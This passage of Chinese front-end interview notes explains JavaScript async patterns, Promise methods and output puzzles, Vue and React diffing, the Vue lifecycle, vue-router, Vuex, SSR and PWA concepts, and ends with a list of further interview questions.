            setTimeout(function() {
                resolve(greeting);
            },1500);
        });
    }
    
    (async function(){
        var v1 = await say('Hello');
        console.log(v1);
    
        var v2 = await say('World');
        console.log(v2);
    }());
    ```

  * yield + promise实现

    ```js
    function yieldPromise(generator){
        var iterator=generator();
        recursiveCore.call(iterator);
    }
    
    function recursiveCore(feedback){
        var iterator=this,
            result=iterator.next(feedback);
    
        if(result.done){
            return;
        }
    
        var promise=result.value;
        Promise.resolve(promise).then(function(v){
            recursiveCore.call(iterator,v);
        });
    }
    
    yieldPromise(function*(){
        var v1 = yield new Promise(function(resolve,reject){
            setTimeout(function(){
                resolve('Hello');
            },1500);
        });
    
        console.warn(v1);
    
        var v2 = yield new Promise(function(resolve,reject){
            setTimeout(function(){
                resolve('World');
            },1500);
        });
    
        console.warn(v2);
    });
    
    ```

  * yield 实现

    ```js
    function yieldContinuation(generator){
        var iterator = generator();
        recursiveCore.call(iterator);
    }
    
    function recursiveCore(feedback){
        var iterator = this,
            result = iterator.next(feedback);
    
        if(result.done){
            return;
        }
    
        var yieldFunc = result.value;
        // 传入一个函数作为参数k, 函数参数v相当于k函数的实参
        yieldFunc(function(v){
            recursiveCore.call(iterator,v);
        });
    }
    
    yieldContinuation(function*(){
        var v1 = yield function(k){
            setTimeout(function(){
                k('Hello');
            },1500);
        };
    
        console.warn(v1);
    
        var v2 = yield function(k){
            setTimeout(function(){
                k('World');
            },1500);
        };
    
        console.warn(v2);
    });
    
    ```



* **什么是浮动， 怎么清除浮动？**

  * 定义： 浮动元素会脱离文档流并向左/向右浮动，直到碰到父元素或者另一个浮动元素

  * 清除： 

    * 使用`clear: both`, 解决父容器高度坍塌

      clear属性不允许被清除浮动的元素的左边/右边挨着浮动元素

      ```html
      <div class="box-wrapper">
          <div class="box"></div>
          <div class="box"></div>
          <div class="box"></div>
      </div>
      ```

      ```css
      .box {
      	float: left;
      }
      .box-wrapper:after {
          content: ' ';
          clear: both;
      }
      ```

    * 使用bfc 

      ```css
      .box-wrapper {
          overflow: hidden;
      }
      ```

* **tcp属于网络协议的那一层哪一层**

  ```css
  1 物理层 -> 2 数据链路层 -> 3 网络层(ip)-> 4 传输层(tcp) -> 5 应用层(http)
  ```



* **什么是纯函数？**

  若一个函数对相同的输入，永远会得到相同的输出，并且**不会影响,引入该函数作用域以外的环境变量**，则此函数称为纯函数 [参考链接](https://www.jianshu.com/p/a9daa1464f9d)








#### Promise

* **基本用法**

  ```js
  // 定时promise
  function timeout(m, message) {
      return new Promise((resolve, reject) => {
          setTimeout(resolve, m, message)
      })
  }
  timeout(1000, 'message').then(function (m) {
      console.log(m)
  })
  
  // 图片加载promise
  function imgPromise(url) {
      return new Promise((resolve, reject) => {
          let img = new Image()
          img.timeBegin = new Date()
          img.onload = function () {
              resolve(img)
          }
          img.onerror = function (err) {
              console.error('can not load img' + url)
          }
          img.src = url
      })
  }
  imgPromise('//cdn2.jianshu.io/assets/web/web-note-ad-side-banner-22096669b4c4b91c3b9266894e951aef.png').then((img) => {
      img.timeEnd = new Date()
      console.log('spend time', img.timeEnd - img.timeBegin)
  })
  ```

* **Promise.resolve（param）**

  将现有对象转化为promise对象

  ```js
  Promise.resolve(123)
  // 相当于
  new Promise(resolve => resolve(123))
  ```

  **参数**：

  * 空： 直接返回一个resolved状态的promise对象

  * promise对象， 直接返回原对象， 不做处理

  * 不具有then方法的对象， 或不是对象： 返回新promise对象， 状态为resolved

    ```js
    const p = Promise.resolve(666)
    p.then(() => {console.log(666)}) // 666
    ```

  * 具有then方法的对象， 先转换为promise对象， 然后立即执行thenable的then方法

    ```js
    let thenable = {
        then: function (resolve, reject) {resolve('7878')}
    }
    
    let p = Promise.resolve(thenable)
    p.then(function(value) {
        console.log(value)
    })
    ```

* **Promise.reject(param)**

  返回一个promise实例， 状态为rejected

  ```js
  const p = Promise.reject('666')
  // 相当于
  const m = new Promise((resolve, reject) => reject('666'))
  m.then(null, function (s) {
      console.log(s)
  })
  ```

* **Promise.all**

  Promise.all方法用于将多个 Promise 实例，包装成一个新的 Promise 实例

  `Promise.all`方法接受一个数组作为参数，`p1`、`p2`、`p3`都是 Promise 实例，如果不是，就会先调用下面讲到的`Promise.resolve`方法，将参数转为, 该方法返回一个结果数组

  （1）只有`p1`、`p2`、`p3`的状态都变成`fulfilled`，`p`的状态才会变成`fulfilled`，此时`p1`、`p2`、`p3`的**返回值组成一个数组**，传递给`p`的回调函数。

  （2）只要`p1`、`p2`、`p3`之中有一个被`rejected`，`p`的状态就变成`rejected`，**此时第一个被`reject`的实例的返回值**，会传递给`p`的回调函数

  ```js
  const p = Promise.all([p1, p2, p3])
  p.then(function ([p1val, p2val, p3val]) {
      console.log(p1val, p2val, p3val)
  })
  ```

* **Promise.race**(竞赛)

  将多个 Promise 实例，包装成一个新的 Promise 实例

  只要`p1`、`p2`、`p3`之中有一个实例率先改变状态，`p`的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给`p`的回调函数

  ```js
  const p = Promise.race([
    fetch('/resource-that-may-take-a-while'),
    new Promise(function (resolve, reject) {
      setTimeout(() => reject(new Error('request timeout')), 5000)
    })
  ]);
  
  p
  .then(console.log)
  .catch(console.error);
  ```

* **Promise.prototype.then(resolveCallback, rejectCallback)**

  then期望接受一个函数， 若不是函数， 将会发生值穿透， then方法返回的是一个**新的promise**， 不是之前的promise对象， 可以采用链式调用

  第一个回调函数完成以后，**会将返回结果作为参数，传入第二个回调函数**

  ```js
  getMember(id).then(function (member) {
      return getComment(comment.id)
  }).then(function (comment) {
      console.log(comment)
  }, fucntion (err) {
  	console.error(err)        
  })
  ```

* **Promise.prototype.catch(rejectCallback)**

  catch是then(null, rejectCallback)的语法糖

  ```js
  getJSON('/posts.json').then(function(posts) {
    // ...
  }).catch(function(error) {
    // 处理 getJSON 和 前一个回调函数运行时发生的错误
    console.log('发生错误！', error);
  });
  ```

* **Promise.prototype.finally**

  finally方法用于指定不管 Promise 对象最后状态如何，都会执行的操作

* **Promise题目**

  * 分析打印结果

    ```js
    let p = Promise.resolve(1)
    p.then(function (value) {
        console.log(value)
        return 3
    }).then(function (value) {
        console.log(value)
    })
    setTimeout(function () {
        console.log(4)
    }, 0)
    console.log(2)
    
    // 2, 1, 3, 4
    ```

    ```js
    let p = Promise.resolve(1)
    p.then(function (value) {
        console.log(value)
        return new Promise((resolve, reject) => {
            resolve(3)
        })
    }).then(function (value) {
        console.log(value)
    })
    setTimeout(function () {
        console.log(4)
    }, 0)
    console.log(2)
    
    // 2, 1, 3, 4
    ```

  * 状态只能改变一次

    ```js
    const promise = new Promise((resolve, reject) => {
      resolve('success1')
      reject('error')
      resolve('success2')
    })
     
    promise
      .then((res) => {
        console.log('then: ', res)
      })
      .catch((err) => {
        console.log('catch: ', err)
      })
    
    // then: success1
    ```

  * 值穿透

    `.then` 或者 `.catch` 的参数期望是函数，传入非函数则会发生值穿透

    ```js
    Promise.resolve(1)
      .then(2)
      .then(Promise.resolve(3))
      .then(console.log)
    // 1 
    ```

  * 错误捕获

    ```js
    Promise.resolve()
      .then(function success (res) {
        throw new Error('error')
      }, function fail1 (e) {
        console.error('fail1: ', e)
      })
      .catch(function fail2 (e) {
        console.error('fail2: ', e)
      })
    // fail2: ...
    ```





#### 深入响应式原理与MVVM思想



##### 什么是AST？

AST（abstruct syntax tree）抽象语法树， 是源代码的抽象结构的树状表现。

Vue在mount过程中， template会被编译为AST，经过generate（AST转化为render函数）得到render， render函数返回Vnode， Vnode是Vue的虚拟dom节点， 保存着标签名， 子节点， 属性， 文本信息等



**Vue 的 VNode渲染为真实dom（diff算法）的实现 ?**

> vue源码在`src/core/vdom/patch.js`实现

* **createPatchFunction** 接受一个参数， 返回一个 patch 函数
* **patch** 接受参数 oldVnode， vnode, hydrating, removeOnly, parentElm, refElm, 用于对比新旧Vnode变化，执行相应操作
  * oldVnode: 旧的虚拟节点或旧的真实dom节点
  * vnode: 新的虚拟节点
  * hydrating: 是否要跟真是dom混合
  * removeOnly: 特殊flag，用于<transition-group>组件
  * parentElm:父节点
  * refElm: 新节点将插入到refElm之前
* **patch 函数 实现**
  * 若 oldVnode 存在， vnode不存在， 则调用 `invokeDestroyHook(oldVnode)` 销毁oldVnode
  * 若vnode存在， oldVnode不存在， 则使用` createElm `新建vnode
  * 若vnode和oldVnode是相同的VirtualNode， 则调用 patchVnode 比较两个节点的差异
  * 当vnode和oldVnode不是同一个节点时， 创建Vnode插入到oldVnode.elm的父节点上
* **patchVnode 实现**
  * 如果oldVnode === Vnode 直接返回， 无操作
  * 如果vnode和oldVnode具有相同的key， 则把oldVnode.elm和oldVnode.child都复制到vnode上，也不用再有其他操作
  * 如果vnode是text节点， 就设置文本内容
  * 如果vnode不是text节点
    * 如果oldVnode与vnode都有子节点，并且子节点不相等，就调用updateChildren执行更新子节点操作
    * oldVnode没有子节点，vnode有子节点，则创建节点
    * oldVnode有子节点，vnode没有子节点，就移除旧的节点
    * 如果oldVnode为text节点，就移除文本节点



##### Vnode的分类都有哪些？

* EmptyVnode
* TextVnode
* ComponentVnode
* ElementVnode
* CloneVnode



##### react 的 diff算法实现过程?

  [介绍](https://www.infoq.cn/article/react-dom-diff)


  Web 界面由 DOM 树来构成，当其中某一部分发生变化时，其实就是对应的某个 DOM 节点发生了变化.

  给定任意两棵树, 寻找差异, 找到最少转换步骤.标准的diff算法复杂度是O(n^3), react优化后的diff算法复杂度降为O(n). 

* **diff算法思想(优化假设)**

  * 两个相同组件产生类似的 DOM 结构，不同的组件产生不同的 DOM 结构
  * 对于同一层次的一组子节点，它们可以通过唯一的 id 进行区分

* **节点比较**

  * **节点类型不同**的比较

    * 在同一位置前后输出了**不同类型**的节点, 则**直接替换**

      ```html
      span ---> div
      removeNode span , insertNode div
      ```

    * **逐层进行节点比较,** 两棵树只会对**同一层次**的节点进行比较.**及不在同一层的节点, 即使他们完全一样, 也会销毁并重建**. 如图. React 只会对相同颜色方框内的 DOM 节点进行比较，即同一个父节点下的所有子节点。当发现节点已经不存在，则该节点及其子节点会被完全删除掉，不会用于进一步的比较。这样只需要对树进行一次遍历，便能完成整个 DOM 树的比较

      ![diff](./imgs/diff.png)

  * **相同类型节点比较**

    * 对于相同类型的节点, react会对**属性进行重设**从而实现**节点转换**

      ```jsx
      renderA: <div id="before" />
      renderB: <div id="after" />
      => [replaceAttribute id "after"]
      ```

    * 列表节点的比较, React 会逐个对节点进行更新，转换到目标节点



#### vue

* ##### 实现vue的几个关键类有哪些， 作用是什么

  **类:**

  - **Compile**，对指令进行解析，初始化视图，并且订阅数据的变更，绑定好更新函数
  - **Observer**，对数据进行劫持，通知数据的变化
  - **Watcher**，将其作为以上两者的一个中介点，在接收数据变更的同时，让Dep添加当前Watcher，并及时通知视图进行update
  - **Dep** 发布订阅事件相关
  - **MVVM**，整合以上三者，作为一个入口函数

  **步骤：**

  - 第一步：创建`MVVM`、`Compile`类，并且利用`createDocumentFragment`将`<div id="app"></div>`下的标签放到`JS文档碎片`中去。
  - 第二步：`Compiler`对 标签 进行编译，将带有 `v-` 指令的标签和`{}`的标签解析出来
  - 第三步：创建`Observer类`进行数据劫持、深度递归劫持和代理，当data中设置值或者修改值的时候，利用`Object.defineProperty`对值进行监控。
  - 第四步：创建`Watch类`观察者，用新值和老值进行比对，如果发生变化，就调用更新方法，进行视图更新。
  - 第五步：将输入框`v-model`和视图绑定起来，输入框的值变化，同时页面中通过`{}`绑定的值也变化，实现`双向数据绑定`。
  - 第六步：在`MVVM类`中，设置`proxyData`代理，将`vm.$data`的值代理到`vm`上，即可以直接通过 `vm`


- **vue是什么？ 有哪些特性？**

  vuejs是一套基于mvvm思想的， 构建用户界面的框架。vue在设计上着重关心视图层， 特点有双向数据绑定， vue后缀的单文件组件， 低耦合， 可复用性强， 独立开发， 可测试性， 2.0支持virtualdom.

  特性： **数据驱动， 单文件组件系统**

- **vue如何优化首屏加载速度？**

  * 大文件定位， 使用webpack bundle analyzer， 运行`npm run build --report` 查看工程js大小，， 优化大文件

  * 路由视图懒加载

    ```js
    const page = () => require('page.vue')
    ```

  * 将js文件放入body的最后， 使用`html-webpack-plugin`插件， 将`inject`的值改为`body`

    ```
    plugins: [
            new htmlWebpackPlugin({
                inject: 'body'
            })
        ]
    ```

  * 将其他js库使用cdn方式引入

  * UI库按需引用

  * 开启gzip压缩

    在config/index.js

    ```js
    build: {
        productionGzip: true
    }
    ```

- **Vue打包后会生成哪些文件**

  - index.html 单页文件入口
  - app.[hash].css 所有组件中的css
  - app.[hash].js 包含所有组件中的js代码
  - vendor.[hash].js 包含vue及其他node_modules代码
  - mainifest.[hash].js 包含了webpack运行环境和模块化所需的js
  - 0~n.[hash].js vue-router按需加载生成的js

- **key的作用**?

  用于管理可复用的元素, vue保证高效的渲染元素, 通常会复用已有元素而不是从头开始.

- **keep-alive 的作用?**

  主要用于保留组件状态和避免重新渲染, 属性: include(保存组件状态)和exclude(不缓存组件的状态)

- **怎么实现缓存个别组件？**

  使用keep-alive组件， 在需要缓存的router配置中加入meta

  ```html
  <keep-alive>
      <router-view v-if="$router.meta.keepAlive"></router-view>
  </keep-alive>
  ```

  ```js
  new Router({
      routes: [
          {
              path: '/page1',
              component: page1,
              name: 'page1',
              meta: {
                  keepAlive: true // 控制是否缓存此组件
              }
          }
      ]
  })
  ```

- **实现页面切换动画效果？**

  ```html
  <transiton name="slide-left">
  	<component :is="componentName"></component>
  </transiton>
  <style>
     .slide-left-enter-active {
       animation: slideLeft 0.3s;
     }
    @keyframes slideLeft {
      from {
        transform: translate3d(100%, 0, 0);/*横坐标,纵坐标,z坐标*/
        visibility: visible;
      }
      to {
        transform: translate3d(0, 0, 0);
      }
    }
  </style>
  ```


- **vue的生命周期?**

  vue的实例从新建到销毁的过程, 具体包括:

  开始创建--初始化数据--编译模版--挂载dom渲染--更新渲染—卸载

- **vue生命周期的钩子函数有哪些， 做了什么？**
  - **beforeCreate** 在`实例初始化之后`，数据观测 (data observer) 和 event/watcher 事件配置之前被调用
  - **created** 在`实例创建完成后`被立即调用。在这一步，实例已完成以下的配置：`数据观测 (data observer)`， `属性和方法的运算`，`watch/event 事件回调`, 此时$el属性未赋值，ajax调用建议在此阶段执行
  - **beforeMount**  在`挂载开始之前`被调用：相关的 render 函数首次被调用
  - **mounted** `el` 被新创建的 `vm.$el` 替换，并`挂载到实例上去之后`调用该钩子
  - **beforeUpdate**`数据更新时调用`，发生在虚拟 DOM 打补丁之前。这里适合在更新之前访问现有的 DOM
  - **updated** 由于数据更改导致的`虚拟 DOM 重新渲染和打补丁`，在这`之后`会`调用`该钩子
  - **activated** keep-alive 组件激活时调用
  - **deactivated** keep-alive 组件停用时调用
  - **beforeDestroy** 实例销毁之前调用。在这一步，实例仍然完全可用
  - **destoryed** Vue 实例销毁后调用
  - **errorCaptured** 当捕获一个来自子孙组件的错误时被调用。此钩子会收到三个参数：错误对象、发生错误的组件实例以及错误信息字符串



#### vue-router

* **当路由从/page?id=1变为/page?id=2时怎么通知视图更新**

  * 使用watch 监控 $route 对象

    ```js
    watch: {
        '$route': function (to, from) {
            ...
        }
    }
    ```

  * 使用路由守卫beforeRouteUpdate

    ```js
    beforeRouteUpdate(to, from, next) {
        ...
        next()
    }
    ```

* **vue-router的钩子函数有哪些？**

  * 全局守卫： router.beforeEach

  * 全局解析守卫： router.beforeResolve

  * 全局后置钩子： router.afterEach

  * 路由独享的守卫： beforeEnter

  * 组件内的守卫： beforeRouteEnter、beforeRouteUpdate (2.2 新增)、beforeRouteLeave



* **vue-router 导航解析流程？**

  1、导航被触发。

  2、在失活的组件里调用离开守卫。

  3、调用全局的 `beforeEach` 守卫。

  4、在重用的组件里调用 `beforeRouteUpdate 守卫 (2.2+)`。

  5、在路由配置里调用 `beforeEnter`。

  6、解析异步路由组件。

  7、在被激活的组件里调用 `beforeRouteEnter`。

  8、调用全局的 `beforeResole` 守卫 (2.5+)。

  9、导航被确认。

  10、调用全局的 `afterEach` 钩子。

  11、触发 `DOM` 更新。

  12、用创建好的实例调用 `beforeRouteEnter` 守卫中传给 `next` 的回调函数。



#### Vuex

* **什么是vuex？**

  Vuex 是一个专为 Vue.js 应用程序开发的状态管理器，采用 集中式存储 管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化

* **vuex的核心对象？**
  * state - Vuex store实例的根状态对象，用于定义共享的状态变量。
  * Action -动作，向store发出调用通知，执行本地或者远端的某一个操作（可以理解为store的methods）
  * Mutations -修改器，它只用于修改state中定义的状态变量。
  * getter -读取器，外部程序通过它获取变量的具体值，或者在取值前做一些计算（可以认为是store的计算属性）



- **实际开发过程中遇到过哪些问题?**

  - v-show 的上传文件后页面缓存问题， 使用v-if 解决

  - 因为对父子组件生命周期顺序不了解产生的数据拿不到，和页面视图不更新的问题

    ```js
    父beforeCreate->父created->父beforeMount->子beforeCreate->子created->子beforeMount->子mounted->父mounted
    ```

  - 使用vue-router的路由守卫beforeEach和meta字段实现权限控制和伪登录检测， 不再每个页面中单独实现

  - 浏览器无法记录用户历史浏览的位置， 本来是用store记录位置， 后来使用scrollBehavior来做

  - 数据更新而页面却没更新， 响应式没有理解到位， 使用Vue.set()更新数据

  - style标签不添加scope属性影响其他页面内容， 增加scope属性

  - 页面白屏问题， 在已定义了<teamplate>标签后又在里面写了空的template

  - 首屏加载速度太慢， 采用异步加载机制

  - watch 属性的监控改变使页面卡死， watch不能修改自身

  - v-for没有增加key属性导致页面的效率变低

- **vuex 包含哪些？**

  - state， 包含应用的所有状态, 分别有getters， setters用于获取，设置状态

    ```js
    var s = this.$store.state.a
    ```

  - mutations 更改state的唯一方式， 同步的

    ```js
    this.$store.commit('mutationName', params)
    ```

  - action 提交mutations , 可包含异步操作

    ```js
    this.$store.dispatch('actionName')
    ```

- **vue和react的区别**

  react是基于virtualDOM的， 一种在内存中描述dom的数据结构。react的数据通常被看作不可变的， 而dom更新则是通过virtual dom的diff算法来计算的。

  vue的数据默认是可变的， 通过Object.defineProperty()监控数据， 数据变更会触发dom更新， vue作用于实际dom， 并对真实节点的引用实现双向数据绑定。



* **使用什么处理ajax？ 什么是fetch？**

  **axios 或 fetch**

  ```js
  fetch(url).then(res => res.data).then(...)
  let data = await fetch(url)
  ```

* **什么是骨架屏？**

  骨架屏可以理解为是当数据还未加载进来前，页面的一个空白版本，一个简单的关键渲染路径

  生成骨架屏的方法：

  * 手写html， css， 维护成本高， 页面改动骨架屏也需要改动
  * 使用base64图片作为骨架屏
  * 借助插件自动生成并插入骨架屏 vue-skeleton-webpack-plugin， page-skeleton-webpack-plugin

* **什么是ssr， prerendering？**

  * **ssr serverside render 服务端渲染**

    **Nuxt.js** 框架可以实现服务端渲染

    优势： 利于seo， 更快的内容到达时间（无需等待js下载完成）

    缺点： 需要借助nodejs server， 服务器资源开销大，  受开发条件限定， 某些异步数据无法ssr。

  * **prerendering 预渲染**

    webpack插件 **prerender-spa-plugin** 可以达到预渲染

    在构建时(build time)简单地生成针对特定路由的静态 HTML 文件。优点是设置预渲染更简单，并可以将你的前端作为一个完全静态的站点

    ```javascript
    const path = require('path')
    const PrerenderSPAPlugin = require('prerender-spa-plugin')
    
    module.exports = {
      plugins: [
        new PrerenderSPAPlugin({
          staticDir: path.join(__dirname, 'dist'),
          // Required - Routes to render.
          routes: [ '/', '/about', '/some/deep/nested/route' ],
        })
      ]
    }
    ```



* **什么是PWA?** 

  Progress Web App, 提升web app的一种新方法, 能给用户原生应用的体验.

  pwa的特点: 

  * 可靠- 即使在不稳定的网络环境下, 也能瞬间加载并展现

  * 体验- 快速响应, 有平滑的动画响应用户操作

  * 粘性- 有沉浸式的用户体验

* **什么是serviceWorker?**

  **先决条件:** 浏览器支持, https

  **服务工作线程**, 服务工作线程是浏览器在后台独立于网页运行的脚本, 包含**推送通知**, 和 **后台同步**等, **拦截和处理网络请求**, 通过程序来**管理缓存中的响应**.

  * 它是一种javascript工作线程, **无法访问dom(没有windows/document对象)**, 服务工作线程通过响应, **postMessage** 接口来通信.
  * 服务工作线程是一种可编程网络代理，让您能够控制页面所发送网络请求的处理方式
  * 它在不用时会被中止，并在下次有需要时重启, 可以访问indexDB API
  * 服务工作线程广泛的使用promise

  **服务工作线程的生命周期**

  * 完全独立于网页
  * 步骤: 注册, 安装, 激活, 实施控制, 终止

  **使用**

  ```js
  if ('serviceWorker' in navigator) {
      window.addEventListener('load', function () {
          navigator.serviceWorker.register('/one.js').then(function () {
              
          })
      })
  }
  ```

* **什么是mainifest?**

  web应用程序清单在一个json文件中提供程序的信息, 目的是为了使web应用安装到设备屏幕上.

  ```html
  <link rel="manifest" href="/manifest.json" />
  ```

  > Manifest.json

  ```json
  {
    "name": "HackerWeb",
    "short_name": "HackerWeb",
    "start_url": ".",
    "display": "standalone",
    "background_color": "#fff",
    "description": "A simply readable Hacker News app.",
    "icons": [{
      "src": "images/touch/homescreen48.png",
      "sizes": "48x48",
      "type": "image/png"
    }],
    "related_applications": [{
      "platform": "web"
    }, {
      "platform": "play",
      "url": "https://play.google.com/store/apps/details?id=cheeaun.hackerweb"
    }]
  }
  
  ```

* **什么是 workbox?**

  google提出的web app 静态资源本地存储方案, 该解决方案, 包含一些js库和构建工具.



### 补充

* 讲项目里面的鉴权和图片懒加载怎么实现的
* 讲express框架的设计思想
* 讲vue-lazyloader的原理，手写伪代码
* 线上日志是如何处理的
* 讲事件循环
* 讲nodejs的eventEmitter的实现
* 讲express的中间件系统是如何设计的
* 使用es5实现es6的class
* websocket握手过程
* 浏览器的事件循环和nodejs事件循环的区别
* JavaScript的sort方法内部使用的什么排序？
* 函数式编程
* 项目中怎么用的webpack，怎么优化
* 手动实现parseInt
* 手写vue的mixin方法
* 手写promise的all方法
* 如何存储二叉树、如何存储完全二叉树、如何存储满二叉树
* 实现一个发布订阅系统，包括
* on、emit、off等等，其实就是eventEmitter
* 如何实现一个可设置过期时间的localStorage
* 用JavaScript的异步实现sleep函数
* 手写快排，时间复杂度，优化
* websocket握手过程
* 对vuex的理解，单向数据流
* 设计一个单点登录的系统，类似阿里系那种
* 实现一个联想搜索组件
* tcp/ip网络层，http的特点
* http强行使用udp能实现吗
* webpack热更新原理，使用过的插件









